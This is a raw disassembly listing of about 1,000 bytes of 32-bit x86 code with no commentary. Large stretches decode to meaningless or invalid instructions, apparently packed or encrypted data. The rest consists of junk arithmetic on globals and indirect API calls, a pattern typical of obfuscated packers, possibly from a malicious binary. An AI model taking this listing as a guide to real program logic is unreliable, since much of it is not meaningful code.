  41b84e:	test   al,0x1b
  41b850:	mov    esi,0xb9b21e99
  41b855:	pop    es
  41b856:	enter  0xb94b,0x83
  41b85a:	fisub  WORD PTR [ebp+0x4]
  41b85d:	je     0x41b849
  41b85f:	jg     0x41b8ce
  41b861:	inc    edx
  41b862:	jge    0x41b892
  41b864:	mov    ah,0xcb
  41b866:	pop    es
  41b867:	(bad)  
  41b868:	jg     0x41b811
  41b86a:	shl    BYTE PTR [eax+0x73],0xfb
  41b86e:	mov    WORD PTR [edi],es
  41b870:	add    eax,0xbbff6d2a
  41b875:	mov    ds:0x23babfe3,al
  41b87a:	xchg   edi,eax
  41b87b:	push   eax
  41b87c:	lahf   
  41b87d:	aad    0xf3
  41b87f:	cmp    dh,BYTE PTR [edx-0x2e]
  41b882:	pop    eax
  41b883:	das    
  41b884:	pop    ds
  41b885:	out    dx,eax
  41b886:	out    0x6,eax
  41b888:	outs   dx,BYTE PTR ds:[esi]
  41b889:	jo     0x41b8a5
  41b88b:	call   0xfe1a:0x13249a1
  41b892:	xor    ch,BYTE PTR [ecx+0x3ddf9347]
  41b898:	push   edx
  41b899:	or     al,0x6e
  41b89b:	test   BYTE PTR [ebx],dl
  41b89d:	pop    ss
  41b89e:	mov    BYTE PTR [edx+eiz*8-0x19],ch
  41b8a2:	popa   
  41b8a3:	cmp    eax,0xd5291de3
  41b8a8:	sar    BYTE PTR [edi-0xc],1
  41b8ab:	loopne 0x41b906
  41b8ad:	push   esp
  41b8ae:	jecxz  0x41b841
  41b8b0:	pop    es
  41b8b1:	ins    BYTE PTR es:[edi],dx
  41b8b2:	add    al,BYTE PTR [edi+ecx*4]
  41b8b5:	addr16 hlt 
  41b8b7:	das    
  41b8b8:	xchg   ecx,eax
  41b8b9:	jnp    0x41b88e
  41b8bb:	test   BYTE PTR [esi],bh
  41b8bd:	sbb    DWORD PTR [ebx],eax
  41b8bf:	sbb    edx,DWORD PTR [esi]
  41b8c1:	xchg   DWORD PTR [edi-0x72],esi
  41b8c4:	inc    ebp
  41b8c5:	mov    dh,0x39
  41b8c7:	xor    eax,0xe678b409
  41b8cc:	dec    ebx
  41b8cd:	fsub   DWORD PTR ds:0xd851
  41b8d2:	retf   0xe3b6
  41b8d5:	xchg   ebx,eax
  41b8d6:	mov    ecx,0x26bf11be
  41b8db:	into   
  41b8dc:	push   ds
  41b8dd:	(bad)  [edx]
  41b8df:	push   ebp
  41b8e0:	mov    ebx,0x788638
  41b8e5:	call   0x709b7044
  41b8ea:	in     al,dx
  41b8eb:	ficom  WORD PTR [esi-0x47]
  41b8ee:	lea    ebx,[ecx+0x56]
  41b8f1:	mov    fs,WORD PTR [eax+0x10aa318f]
  41b8f7:	mov    ds:0x5e07926d,eax
  41b8fc:	es push es
  41b8fe:	fdivr  DWORD PTR [ecx+eiz*4+0x6b42acb4]
  41b906:	dec    edx
  41b907:	dec    esi
  41b908:	or     BYTE PTR ds:0x6f3abad6,0x70
  41b90f:	test   eax,0x1f94ea1b
  41b914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b915:	mov    edx,0x63f6bfea
  41b91a:	leave  
  41b91b:	xchg   edx,eax
  41b91c:	dec    edx
  41b91d:	xchg   ebx,eax
  41b91e:	push   edx
  41b91f:	retf   
  41b920:	sar    BYTE PTR [ebp-0x3787ca19],cl
  41b926:	mov    ch,0xf6
  41b928:	sbb    eax,0xc7c26d87
  41b92d:	sub    al,0x8b
  41b92f:	sbb    esp,DWORD PTR [edi]
  41b931:	scas   al,BYTE PTR es:[edi]
  41b932:	arpl   WORD PTR [esi+0x5a],di
  41b935:	test   esp,0x30f26440
  41b93b:	mov    bh,0xde
  41b93d:	push   ebp
  41b93e:	or     edi,ebx
  41b940:	pop    ebx
  41b941:	xor    bl,cl
  41b943:	fild   DWORD PTR [eax-0x7ffd047a]
  41b949:	enter  0x6ef8,0x6e
  41b94d:	xchg   ebx,eax
  41b94e:	ja     0x41b9b1
  41b950:	enter  0x9484,0x20
  41b954:	jg     0x41b8e6
  41b956:	fiadd  WORD PTR [ebx+0x45]
  41b959:	xlat   BYTE PTR ds:[ebx]
  41b95a:	jecxz  0x41b979
  41b95c:	out    0x88,al
  41b95e:	stos   BYTE PTR es:[edi],al
  41b95f:	cmp    DWORD PTR ds:0xf844d382,ecx
  41b965:	lods   al,BYTE PTR ds:[esi]
  41b966:	in     eax,dx
  41b967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b968:	xor    dl,BYTE PTR [edi]
  41b96a:	dec    ebp
  41b96b:	jge    0x41b92a
  41b96d:	jmp    FWORD PTR [ecx-0x43a65c67]
  41b973:	aaa    
  41b974:	cli    
  41b975:	jl     0x41b9df
  41b977:	test   al,0xe5
  41b979:	in     eax,0x9b
  41b97b:	sbb    al,0x9
  41b97d:	cmp    dh,cl
  41b97f:	add    DWORD PTR [ecx-0x71],edi
  41b982:	xchg   ecx,eax
  41b983:	retf   0xfa7e
  41b986:	sub    al,0xef
  41b988:	sbb    bh,cl
  41b98a:	loopne 0x41b9ca
  41b98c:	loop   0x41b9d6
  41b98e:	(bad)  
  41b98f:	sub    al,0x63
  41b991:	mov    al,BYTE PTR ds:0xe5c039c3
  41b997:	jno    0x41b96c
  41b999:	jb     0x41b984
  41b99b:	jne    0x41ba1b
  41b99d:	fwait
  41b99e:	mov    ah,0x9a
  41b9a0:	push   esi
  41b9a1:	sub    edi,DWORD PTR [ecx]
  41b9a3:	dec    ecx
  41b9a4:	push   cs
  41b9a5:	pushf  
  41b9a6:	sub    bl,BYTE PTR [eax]
  41b9a8:	in     eax,dx
  41b9a9:	add    BYTE PTR [esi],0xc5
  41b9ac:	scas   al,BYTE PTR es:[edi]
  41b9ad:	and    DWORD PTR [ebx+0x23e3a4d2],ebx
  41b9b3:	pop    esi
  41b9b4:	add    ch,BYTE PTR [edi+0x67]
  41b9b7:	inc    esi
  41b9b8:	add    al,0x17
  41b9ba:	adc    al,bl
  41b9bc:	and    al,0x5a
  41b9be:	push   0xffffff86
  41b9c0:	mov    bl,BYTE PTR [edi+0x5e6ed502]
  41b9c6:	mov    cl,0xd5
  41b9c8:	std    
  41b9c9:	xchg   edx,eax
  41b9ca:	cmp    al,0x69
  41b9cc:	push   eax
  41b9cd:	adc    BYTE PTR [edx-0x61],dl
  41b9d0:	xor    eax,0x97a2a1fc
  41b9d5:	pop    ss
  41b9d6:	mov    DWORD PTR es:[ecx+esi*8-0x73],edi
  41b9db:	push   esp
  41b9dc:	xor    al,BYTE PTR [esp+edx*1+0x11]
  41b9e0:	adc    BYTE PTR [ecx-0x25],cl
  41b9e3:	div    edx
  41b9e5:	mov    bh,0x3a
  41b9e7:	loopne 0x41ba12
  41b9e9:	jnp    0x41ba4e
  41b9eb:	mov    bh,BYTE PTR [edx+edi*4-0x64]
  41b9ef:	pusha  
  41b9f0:	in     al,0xa7
  41b9f2:	ror    DWORD PTR [edx+ecx*2+0x8],cl
  41b9f6:	lods   eax,DWORD PTR ds:[esi]
  41b9f7:	lods   eax,DWORD PTR ds:[esi]
  41b9f8:	(bad)  
  41b9fa:	and    ch,BYTE PTR [ebx+ecx*4+0x6e6ed461]
  41ba01:	and    esp,ebp
  41ba03:	fnstsw WORD PTR [ebp-0x66d2aef4]
  41ba09:	stos   DWORD PTR es:[edi],eax
  41ba0a:	and    eax,0x44c61dda
  41ba0f:	adc    eax,0x75dc0985
  41ba14:	or     al,0xec
  41ba16:	xor    ecx,DWORD PTR [ecx+0x2134d57]
  41ba1c:	aad    0xce
  41ba1e:	sbb    cl,BYTE PTR [edx]
  41ba20:	fimul  DWORD PTR [ebx+0x1581d84d]
  41ba26:	jbe    0x41ba51
  41ba28:	inc    edx
  41ba29:	add    BYTE PTR [esi-0x74ffbdd7],dl
  41ba2f:	jne    0x41ba0d
  41ba31:	xor    eax,0x2340
  41ba36:	and    eax,ecx
  41ba38:	sbb    DWORD PTR ds:0x4228f6,0x422972
  41ba42:	xor    edx,0x452
  41ba48:	and    edx,esi
  41ba4a:	cmp    DWORD PTR ds:0x42298a,0x0
  41ba51:	mov    esi,DWORD PTR ds:0x4228da
  41ba57:	mov    esi,0x28ad
  41ba5c:	jmp    0x41ba97
  41ba61:	mov    DWORD PTR ds:0x422952,0x4940
  41ba6b:	ja     0x41ba89
  41ba71:	push   DWORD PTR [ebp-0x24]
  41ba74:	push   DWORD PTR [ebp-0x28]
  41ba77:	call   DWORD PTR ds:0x42a17c
  41ba7d:	sub    ecx,DWORD PTR ds:0x4228fa
  41ba83:	xor    DWORD PTR ds:0x4228ee,edi
  41ba89:	adc    DWORD PTR ds:0x4228fa,0x422972
  41ba93:	and    ecx,esi
  41ba95:	adc    ecx,esi
  41ba97:	and    eax,0x3741
  41ba9c:	mov    DWORD PTR [ebp-0x10],eax
  41ba9f:	and    edx,0x445b
  41baa5:	cmp    DWORD PTR ds:0x4229b6,0x0
  41baac:	mov    ecx,DWORD PTR ds:0x42293e
  41bab2:	mov    DWORD PTR ds:0x4229ce,ebx
  41bab8:	mov    esi,0x2c04
  41babd:	jmp    0x41bb16
  41bac2:	mov    DWORD PTR ds:0x42293a,edi
  41bac8:	jle    0x41bafe
  41bace:	push   0x3ca9
  41bad3:	call   DWORD PTR ds:0x42a058
  41bad9:	movzx  esi,WORD PTR ds:0x4228b2
  41bae0:	sbb    esi,DWORD PTR ds:0x4228fa
  41bae6:	mov    DWORD PTR ds:0x4228b2,esi
  41baec:	and    DWORD PTR ds:0x4228b2,0x689
  41baf6:	sub    ecx,esi
  41baf8:	sbb    DWORD PTR ds:0x4228de,edi
  41bafe:	sbb    DWORD PTR ds:0x4228f2,ecx
  41bb04:	mov    ecx,DWORD PTR ds:0x42295e
  41bb0a:	or     DWORD PTR ds:0x4228fe,ecx
  41bb10:	add    DWORD PTR ds:0x422992,ecx
  41bb16:	mov    DWORD PTR [ebp-0xc],edx
  41bb19:	mov    DWORD PTR [ebp-0x20],0x5770
  41bb20:	mov    eax,ds:0x422a7a
  41bb25:	mov    ecx,DWORD PTR ds:0x422b0e
  41bb2b:	sub    eax,ecx
  41bb2d:	and    eax,DWORD PTR [eax+ecx*1]
  41bb30:	mov    DWORD PTR [ebp-0x1c],0x18fc
  41bb37:	jmp    0x41bd54
  41bb3c:	mov    dh,0xdf
  41bb3e:	or     DWORD PTR [ecx-0x48],edx
  41bb41:	and    BYTE PTR [esi],ch
  41bb43:	pop    eax
  41bb44:	(bad)
  41bb48:	mov    al,0x2f
  41bb4a:	push   0xffffffae
  41bb4c:	fadd   QWORD PTR ds:0xc1e160c
  41bb52:	push   ss
  41bb53:	push   ss
  41bb54:	jno    0x41bbd5
  41bb56:	mov    eax,0xa26cea37
  41bb5b:	enter  0xf2ff,0x3d
  41bb5f:	lods   al,BYTE PTR ds:[esi]
  41bb60:	jmp    0x76b0:0xcc157d11
  41bb67:	fld    TBYTE PTR [ebx+0x7b07440b]
  41bb6d:	sbb    al,0x8c
  41bb6f:	and    dl,BYTE PTR [ebx+0x31]
  41bb72:	pop    es
  41bb73:	and    BYTE PTR [ecx-0x321c24b7],dl
  41bb79:	enter  0x6382,0xbf
  41bb7d:	out    dx,al
  41bb7e:	inc    ecx
  41bb7f:	mov    al,ds:0xc5fd5dcb
  41bb84:	shl    bh,1
  41bb86:	cmp    DWORD PTR [eax+ecx*1],0xf03832f2
  41bb8d:	cmp    al,0xac
  41bb8f:	inc    ecx
  41bb90:	xor    DWORD PTR [ecx-0x14],esp
  41bb93:	lock stos DWORD PTR es:[edi],eax
  41bb95:	mov    WORD PTR [edx-0x61],cs
  41bb98:	(bad)  
  41bb99:	mov    esp,0x63def8be
  41bb9e:	mov    al,ds:0xd7fa18b1
  41bba3:	mov    ds:0xd127b92c,eax
  41bba8:	bound  esp,QWORD PTR [ebp-0x35]
  41bbab:	shr    DWORD PTR [ecx],0xab
  41bbae:	dec    eax
  41bbaf:	adc    eax,esp
  41bbb1:	add    al,0x5b
  41bbb3:	xchg   esi,eax
  41bbb4:	add    BYTE PTR [ecx-0x2a],cl
  41bbb7:	adc    dl,BYTE PTR [edx-0x71]
  41bbba:	add    BYTE PTR [edi+ebp*1+0x2dedc006],ah
  41bbc1:	dec    esi
  41bbc2:	out    0x81,al
  41bbc4:	hlt    
  41bbc5:	mov    ch,0xf2
  41bbc7:	lds    ecx,FWORD PTR [ebp+0x6920c03d]
  41bbcd:	inc    ebp
  41bbce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbcf:	loopne 0x41bc42
  41bbd1:	popf   
  41bbd2:	dec    edx
  41bbd3:	mov    edx,0x440fcf82
  41bbd8:	test   al,0x1e
  41bbda:	push   0xa6aa73bc
  41bbdf:	mov    ds:0x34dc4d86,al
  41bbe4:	adc    ebp,DWORD PTR [edi-0x38e46439]
  41bbea:	into   
  41bbeb:	pop    edi
  41bbec:	test   eax,0x88bcea80
  41bbf1:	out    dx,eax
  41bbf2:	mov    dh,0xb1
  41bbf4:	sub    cl,BYTE PTR [ecx+0x6dcfbc09]
  41bbfa:	mov    al,BYTE PTR [esi+0x6c]
  41bbfd:	and    ch,bl
  41bbff:	mov    al,0x54
  41bc01:	jb     0x41bc6c
  41bc03:	cmp    al,0x69
  41bc05:	or     ch,BYTE PTR [edx-0x30]
  41bc08:	sub    DWORD PTR [eax+0x27f2ca23],ebp
  41bc0e:	push   0x27
  41bc10:	pop    ebx
  41bc11:	in     eax,0x39
  41bc13:	std    
  41bc14:	adc    eax,0xd32ee0ff
  41bc19:	pop    esp
  41bc1a:	mov    edi,0x1d42161
  41bc1f:	aam    0x73
  41bc21:	addr16 pop ebp
  41bc23:	inc    ebp
  41bc24:	jns    0x41bc81
  41bc26:	mov    ecx,0xef1270ba
  41bc2b:	pop    esi
  41bc2c:	mov    ch,0xff
  41bc2e:	call   0xf6d5:0x2f9ed167
  41bc35:	cmp    BYTE PTR [edx+0x8d589f5],bl
  41bc3b:	pop    ss
  41bc3c:	cmp    ecx,edx
  41bc3e:	iret   
  41bc3f:	or     eax,0xecb39a20
  41bc44:	lods   al,BYTE PTR ds:[esi]
  41bc45:	nop
  41bc46:	push   ss
  41bc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc48:	inc    ecx
  41bc49:	dec    esi
  41bc4a:	jmp    0x2d1f2bc6
  41bc4f:	lods   eax,DWORD PTR ds:[esi]
  41bc50:	fisttp QWORD PTR [eax+0x28]
  41bc53:	inc    edx
  41bc54:	mov    BYTE PTR [eax],ah
  41bc56:	lock dec edi
  41bc58:	jae    0x41bc37
  41bc5a:	xchg   esi,eax
  41bc5b:	in     al,dx
  41bc5c:	or     al,0x29
  41bc5e:	jecxz  0x41bc21
  41bc60:	out    dx,al
  41bc61:	stos   DWORD PTR es:[edi],eax
  41bc62:	push   eax
  41bc63:	pop    ebp
  41bc64:	xchg   edi,eax
  41bc65:	jp     0x41bc9b
  41bc67:	xor    BYTE PTR [edi+edi*2],ch
  41bc6a:	pusha  
  41bc6b:	pushf  
  41bc6c:	dec    edi
  41bc6d:	mov    ebx,DWORD PTR [ecx+0x50]
  41bc70:	pushf  
  41bc71:	jbe    0x41bcd5
  41bc73:	call   0x9021:0xe18c419b
  41bc7a:	(bad)  
  41bc7b:	call   0xa4a29a78
  41bc80:	jmp    0xd294:0x6f16092a
  41bc87:	inc    edx
  41bc88:	mov    dh,0x22
  41bc8a:	out    dx,eax
  41bc8b:	mov    ecx,edx
  41bc8d:	jno    0x41bd02
  41bc8f:	int3   
  41bc90:	xor    BYTE PTR [ebx],cl
  41bc92:	adc    dl,bh
  41bc94:	icebp  
  41bc95:	push   ebx
  41bc96:	xchg   ebx,eax
  41bc97:	aaa    
  41bc98:	jmp    0x60909f5f
  41bc9d:	xlat   BYTE PTR ds:[ebx]
  41bc9e:	jmp    0x2739a372
  41bca3:	cmp    eax,0x95261d62
  41bca8:	jmp    ebp
  41bcaa:	fbld   TBYTE PTR [ebx]
  41bcac:	pushf  
  41bcad:	mov    al,ds:0x3176dd79
  41bcb2:	test   BYTE PTR [ebx+0x26],dh
  41bcb5:	jl     0x41bcaf
  41bcb7:	push   eax
  41bcb8:	mov    ch,0x8
  41bcba:	and    cl,BYTE PTR ds:0x1d4328ca
  41bcc0:	cmc    
  41bcc1:	pop    esp
  41bcc2:	iret   
  41bcc3:	std    
  41bcc4:	mov    ah,0x1
  41bcc6:	adc    al,0x8e
  41bcc8:	loopne 0x41bc70
  41bcca:	gs cmp al,0x92
  41bccd:	ja     0x41bc83
  41bccf:	stos   DWORD PTR es:[edi],eax
  41bcd0:	into   
  41bcd1:	cmp    eax,0x3767f5b4
  41bcd6:	es icebp 
  41bcd8:	mov    esp,esi
  41bcda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcdb:	ss sbb bl,ch
  41bcde:	int3   
  41bcdf:	inc    ecx
  41bce0:	cmp    al,0xee
  41bce2:	cs mov cl,0xe5
  41bce5:	push   esi
  41bce6:	rcl    DWORD PTR [esp+ebp*2-0x70c0339a],cl
  41bced:	mov    esi,0xd7e65d64
  41bcf2:	mov    ecx,0xa07da7ae
  41bcf7:	xchg   edi,eax
  41bcf8:	or     al,0xb9
  41bcfa:	call   0x211e:0xe2aab544
  41bd01:	pop    ds
  41bd02:	scas   eax,DWORD PTR es:[edi]
  41bd03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd04:	outs   dx,BYTE PTR ds:[esi]
  41bd05:	inc    esp
  41bd06:	call   0xa4742816
  41bd0b:	dec    edx
  41bd0c:	inc    ebx
  41bd0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd0e:	or     al,dh
  41bd10:	rol    ah,0xad
  41bd13:	(bad)  
  41bd14:	ss ins DWORD PTR es:[edi],dx
  41bd16:	and    cl,BYTE PTR [esi]
  41bd18:	out    dx,eax
  41bd19:	dec    edx
  41bd1a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41bd1c:	fdivr  QWORD PTR [ebp-0x461d9ea0]
  41bd22:	jle    0x41bcbc
  41bd24:	mov    esi,0xcf8e7971
  41bd29:	xchg   ebx,eax
  41bd2a:	push   cs
  41bd2b:	popf   
  41bd2c:	fwait
  41bd2d:	add    DWORD PTR [di+0x1b],eax
  41bd31:	dec    DWORD PTR [edx-0x7]
  41bd34:	add    dl,bl
  41bd36:	in     al,0xf1
  41bd38:	popa   
  41bd39:	les    esp,FWORD PTR ds:0xedd8f2ab
  41bd3f:	inc    edi
  41bd40:	cmp    ebp,DWORD PTR [edi+0xe]
  41bd43:	ficom  WORD PTR [edi-0x22]
  41bd46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd47:	push   ecx
  41bd48:	out    0x58,al
  41bd4a:	sub    esp,DWORD PTR [ebp-0x78fab544]
  41bd50:	push   ss
  41bd51:	jge    0x41bd49
  41bd53:	rol    edi,1
  41bd55:	inc    ebp
  41bd56:	fcomp  DWORD PTR [ebx]
  41bd58:	adc    eax,0xca130000
  41bd5d:	mov    DWORD PTR [ebp-0x24],0x1c21
  41bd64:	add    DWORD PTR ds:0x42293a,0x7032
  41bd6e:	mov    eax,DWORD PTR [ebp-0x28]
  41bd71:	mov    DWORD PTR ds:0x4228d6,0x3603
  41bd7b:	mov    ecx,DWORD PTR [ebp-0x24]
  41bd7e:	xor    edx,DWORD PTR ds:0x42295a
  41bd84:	mov    edx,DWORD PTR [ebp-0x20]
  41bd87:	and    esi,DWORD PTR ds:0x422932
  41bd8d:	mov    esi,DWORD PTR [ebp-0x1c]
  41bd90:	add    eax,0x12fa
  41bd95:	push   esi
  41bd96:	adc    ecx,0x31c
  41bd9c:	sbb    DWORD PTR ds:0x422992,0x422932
  41bda6:	push   edx
  41bda7:	neg    DWORD PTR ds:0x4228ae
  41bdad:	and    ecx,0x2420
  41bdb3:	or     DWORD PTR ds:0x422896,0x6744
  41bdbd:	and    eax,0x7f7f
  41bdc2:	sub    DWORD PTR ds:0x42292e,0x4229a6
  41bdcc:	push   ecx
  41bdcd:	push   eax
  41bdce:	or     DWORD PTR ds:0x422932,0x422986
  41bdd8:	call   0x41df90
  41bddd:	mov    DWORD PTR ds:0x4228d2,0x50ed
  41bde7:	mov    esi,DWORD PTR [ebp-0x10]
  41bdea:	mov    ecx,0x61bf
  41bdef:	mov    ecx,DWORD PTR [ebp-0xc]
  41bdf2:	cmp    ecx,edx
  41bdf4:	ja     0x41c147
  41bdfa:	mov    DWORD PTR ds:0x4229aa,0x308e
  41be04:	jb     0x41be1c
  41be0a:	cmp    esi,eax
  41be0c:	mov    DWORD PTR ds:0x4228d2,0x64bb
  41be16:	jae    0x41c147
  41be1c:	adc    ecx,DWORD PTR ds:0x4229ce
  41be22:	mov    DWORD PTR [ebp-0x10],0x6155
  41be29:	mov    DWORD PTR [ebp-0xc],0x201
  41be30:	sub    ecx,DWORD PTR ds:0x4228be
  41be36:	mov    DWORD PTR [ebp-0x20],0x44e0
  41be3d:	cmp    DWORD PTR ds:0x4228ca,0x0
  41be44:	mov    edx,0x767c
  41be49:	not    esi
  41be4b:	jmp    0x41beb8
  41be50:	not    edx
  41be52:	jbe    0x41be93
  41be58:	push   DWORD PTR [ebp-0x18]
  41be5b:	push   0x8f12
  41be60:	push   DWORD PTR [ebp-0x28]
  41be63:	push   0x243c
  41be68:	push   0x73f8
  41be6d:	push   0x4227d9
  41be72:	push   0x400000
  41be77:	call   DWORD PTR ds:0x42a030
  41be7d:	sub    DWORD PTR ds:0x4228be,ebx
  41be83:	sub    ecx,DWORD PTR ds:0x422986
  41be89:	sbb    DWORD PTR ds:0x42292e,0x3fb0
  41be93:	xor    DWORD PTR ds:0x4229c6,0x7a44
  41be9d:	add    DWORD PTR ds:0x4228de,0x618
  41bea7:	mov    edx,DWORD PTR ds:0x422aba
  41bead:	mov    esi,DWORD PTR ds:0x422b16
  41beb3:	sub    esi,edx
  41beb5:	add    edx,DWORD PTR [edx+esi*1]
  41beb8:	mov    DWORD PTR [ebp-0x1c],0x5ee2
  41bebf:	xor    eax,0x576f
  41bec4:	mov    DWORD PTR [ebp-0x28],0x1aff
  41becb:	mov    DWORD PTR [ebp-0x24],0xee6
  41bed2:	mov    eax,DWORD PTR [ebp-0x28]
  41bed5:	cmp    DWORD PTR ds:0x422982,0x0
  41bedc:	mov    DWORD PTR ds:0x42292e,0x189d
  41bee6:	mov    DWORD PTR ds:0x4229c6,edx
  41beec:	jmp    0x41bf36
  41bef1:	mov    DWORD PTR ds:0x4229d2,ebx
  41bef7:	mov    DWORD PTR ds:0x42294e,edx
  41befd:	jl     0x41bf1a
  41bf03:	push   0x3bbb
  41bf08:	call   DWORD PTR ds:0x42a034
  41bf0e:	sub    ecx,DWORD PTR ds:0x42293a
  41bf14:	sbb    DWORD PTR ds:0x4229b2,ebx
  41bf1a:	or     ecx,DWORD PTR ds:0x4229be
  41bf20:	and    DWORD PTR ds:0x4228ea,0x3818
  41bf2a:	sbb    DWORD PTR ds:0x42296e,0x49eb
  41bf34:	adc    ecx,ecx
  41bf36:	mov    ecx,DWORD PTR [ebp-0x24]
  41bf39:	mov    edx,DWORD PTR [ebp-0x20]
  41bf3c:	mov    esi,DWORD PTR [ebp-0x1c]
  41bf3f:	add    eax,edx
  41bf41:	mov    edx,DWORD PTR [ebp-0x10]
  41bf44:	adc    ecx,esi
  41bf46:	mov    esi,DWORD PTR [ebp-0xc]
  41bf49:	or     ecx,0x142d
  41bf4f:	or     eax,0x26da
  41bf54:	add    eax,0x4b35
  41bf59:	adc    ecx,0x509e
  41bf5f:	xor    eax,edx
  41bf61:	xor    ecx,esi
  41bf63:	add    eax,0x5ec6
  41bf68:	mov    DWORD PTR [ebp-0x40],eax
  41bf6b:	adc    ecx,0x3421
  41bf71:	mov    DWORD PTR [ebp-0x3c],ecx
  41bf74:	mov    DWORD PTR [ebp-0x38],0x4edc
  41bf7b:	mov    DWORD PTR [ebp-0x34],0x733f
  41bf82:	mov    DWORD PTR [ebp-0x30],0x58e
  41bf89:	mov    DWORD PTR [ebp-0x2c],0x43b2
  41bf90:	mov    DWORD PTR [ebp-0x10],0x69531b9
  41bf97:	mov    DWORD PTR [ebp-0xc],0x0
  41bf9e:	mov    DWORD PTR [ebp-0x20],0x55d
  41bfa5:	mov    DWORD PTR [ebp-0x1c],0xa30
  41bfac:	mov    DWORD PTR [ebp-0x28],0x1f62
  41bfb3:	mov    DWORD PTR [ebp-0x24],0x677b
  41bfba:	mov    eax,DWORD PTR [ebp-0x28]
  41bfbd:	mov    ecx,DWORD PTR [ebp-0x24]
  41bfc0:	mov    edx,DWORD PTR [ebp-0x20]
  41bfc3:	mov    esi,DWORD PTR [ebp-0x1c]
  41bfc6:	and    eax,edx
  41bfc8:	mov    edx,DWORD PTR [ebp-0x10]
  41bfcb:	and    ecx,esi
  41bfcd:	mov    esi,DWORD PTR [ebp-0xc]
  41bfd0:	push   esi
  41bfd1:	push   edx
  41bfd2:	push   ecx
  41bfd3:	push   eax
  41bfd4:	call   0x421ad5
  41bfd9:	push   0x353c
  41bfde:	push   0x45cf
  41bfe3:	push   edx
  41bfe4:	push   eax
  41bfe5:	call   0x41df90
  41bfea:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfed:	mov    esi,DWORD PTR [ebp-0x2c]
  41bff0:	add    eax,ecx
  41bff2:	mov    ecx,DWORD PTR [ebp-0x38]
  41bff5:	adc    edx,esi
  41bff7:	mov    esi,DWORD PTR [ebp-0x34]
  41bffa:	and    eax,ecx
  41bffc:	mov    ecx,DWORD PTR [ebp-0x40]
  41bfff:	and    edx,esi
  41c001:	mov    esi,DWORD PTR [ebp-0x3c]
  41c004:	cmp    ecx,eax
  41c006:	jne    0x41c014
  41c00c:	cmp    esi,edx
  41c00e:	je     0x41c147
  41c014:	mov    DWORD PTR [ebp-0x40],0x5f3f50d6
  41c01b:	mov    DWORD PTR [ebp-0x3c],0x1
  41c022:	mov    eax,DWORD PTR [ebp-0x40]
  41c025:	mov    ecx,DWORD PTR [ebp-0x3c]
  41c028:	push   ecx
  41c029:	push   eax
  41c02a:	push   0x7850
  41c02f:	push   0x5329
  41c034:	call   0x421ad5
  41c039:	xor    eax,0x100
  41c03e:	xor    edx,0x201
  41c044:	or     eax,0x76ef
  41c049:	or     edx,0x5df4
  41c04f:	mov    DWORD PTR [ebp-0x40],eax
  41c052:	mov    DWORD PTR [ebp-0x3c],edx
  41c055:	mov    eax,ds:0x42247c
  41c05a:	cmp    eax,0x7cd80819
  41c05f:	jne    0x41c147
  41c065:	mov    eax,DWORD PTR [ebp-0x18]
  41c068:	mov    ecx,DWORD PTR [ebp-0x14]
  41c06b:	mov    edx,DWORD PTR [ebp-0x18]
  41c06e:	mov    esi,DWORD PTR [ebp-0x14]
  41c071:	shrd   eax,ecx,0x2
  41c075:	shl    edx,0x1e
  41c078:	mov    edx,DWORD PTR ds:0x422268
  41c07e:	mov    edx,DWORD PTR [edx+0x1a8]
  41c084:	xor    esi,esi
  41c086:	shr    ecx,0x2
  41c089:	mov    ecx,0x2e9a655c
  41c08e:	xor    eax,ecx
  41c090:	or     eax,esi
  41c092:	mov    DWORD PTR [edx],eax
  41c094:	mov    eax,DWORD PTR [ebp-0x18]
  41c097:	mov    edx,DWORD PTR [ebp-0x14]
  41c09a:	shrd   eax,edx,0x2
  41c09e:	shr    edx,0x2
  41c0a1:	mov    edx,DWORD PTR [ebp-0x18]
  41c0a4:	mov    esi,DWORD PTR [ebp-0x14]
  41c0a7:	xor    eax,ecx
  41c0a9:	xor    esi,esi
  41c0ab:	or     eax,esi
  41c0ad:	mov    ds:0x42247c,eax
  41c0b2:	mov    BYTE PTR [ebp-0x6],0x87
  41c0b6:	mov    BYTE PTR [ebp-0x5],0x12
  41c0ba:	mov    BYTE PTR [ebp-0x4],0x2
  41c0be:	mov    BYTE PTR [ebp-0x3],0x93
  41c0c2:	mov    BYTE PTR [ebp-0x2],0x23
  41c0c6:	mov    BYTE PTR [ebp-0x1],0x2
  41c0ca:	mov    al,BYTE PTR [ebp-0x1]
  41c0cd:	movzx  esi,al
  41c0d0:	mov    al,BYTE PTR [ebp-0x2]
  41c0d3:	movzx  eax,al
  41c0d6:	shl    edx,0x1e
  41c0d9:	cdq    
  41c0da:	idiv   esi
  41c0dc:	mov    dl,BYTE PTR [ebp-0x3]
  41c0df:	movzx  edx,dl
  41c0e2:	movzx  eax,al
  41c0e5:	or     eax,edx
  41c0e7:	mov    dl,BYTE PTR [ebp-0x4]
  41c0ea:	movzx  esi,dl
  41c0ed:	cdq    
  41c0ee:	idiv   esi
  41c0f0:	mov    dl,BYTE PTR [ebp-0x5]
  41c0f3:	movzx  esi,dl
  41c0f6:	movzx  eax,al
  41c0f9:	cdq    
  41c0fa:	idiv   esi
  41c0fc:	movzx  edx,BYTE PTR [ebp-0x6]
  41c100:	and    eax,edx
  41c102:	mov    BYTE PTR [ebp-0x4],al
  41c105:	mov    BYTE PTR [ebp-0x5],0x66
  41c109:	mov    BYTE PTR [ebp-0x6],0xcb
  41c10d:	mov    al,BYTE PTR [ebp-0x6]
  41c110:	mov    dl,BYTE PTR [ebp-0x5]
  41c113:	add    al,dl
  41c115:	add    al,0x48
  41c117:	mov    dl,0xe8
  41c119:	imul   dl
  41c11b:	mov    dl,BYTE PTR [ebp-0x4]
  41c11e:	cmp    dl,al
  41c120:	ja     0x41c147
  41c126:	mov    eax,DWORD PTR [ebp-0x18]
  41c129:	mov    edx,DWORD PTR [ebp-0x14]
  41c12c:	shrd   eax,edx,0x2
  41c130:	xor    eax,ecx
  41c132:	mov    ecx,DWORD PTR [ebp-0x18]
  41c135:	shr    edx,0x2
